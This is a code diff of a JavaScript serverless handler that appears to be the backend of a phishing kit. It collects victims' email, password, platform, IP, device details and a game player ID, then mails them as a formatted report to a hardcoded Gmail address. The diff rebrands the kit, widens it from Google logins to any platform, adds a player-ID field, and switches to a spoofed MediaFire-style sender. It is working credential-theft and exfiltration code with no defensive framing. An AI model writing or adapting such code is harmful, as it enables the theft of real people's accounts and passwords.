@@ -45,12 +45,12 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: "BODY_EMPTY" });
         }
 
-        const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
+        const NAMA  = process.env.RESS_NAME  || "STOK KENZ";
         const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";
 
         const flag = countryFlag(d.negaraKode || "");
 
-        const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
+        const previewText = "ID | +62 | " + (d.platform || "Login") + " | IP " + (d.ip || "-");
 
         const htmlBody = `
 <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">
@@ -59,14 +59,20 @@ export default async function handler(req, res) {
 <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
   <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
     <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
-      <h1 style="margin:0;font-size:22px">🕵️ ${NAMA} 🕵️</h1>
+      <h1 style="margin:0;font-size:22px">🀄 ${NAMA} 🀄</h1>
     </div>
     <div style="padding:25px">
-      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
+
+      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">🎮 PLAYER INFO</h3>
+      <table style="width:100%;font-size:14px;border-collapse:collapse">
+        <tr><td style="padding:10px;font-weight:bold;width:35%">ID PLAYER</td><td style="padding:10px">${d.ffId || "-"}</td></tr>
+      </table>
+
+      <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📧 ACCOUNT INFO</h3>
       <table style="width:100%;font-size:14px;border-collapse:collapse">
         <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
         <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
-        <tr><td style="padding:10px;font-weight:bold">LOGIN</td><td style="padding:10px">Google</td></tr>
+        <tr><td style="padding:10px;font-weight:bold">PLATFORM</td><td style="padding:10px">${d.platform || "-"}</td></tr>
       </table>
 
       <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📱 DEVICE INFO</h3>
@@ -104,9 +110,9 @@ export default async function handler(req, res) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                from: NAMA + " <onboarding@resend.dev>",
+                from: NAMA + " <noreply@mediafire.biz.id>",
                 to: [EMAIL],
-                subject: "🕵️ " + NAMA + " 🕵️ - " + Date.now(),
+                subject: "🀄 " + NAMA + " 🀄",
                 html: htmlBody
             })
         });
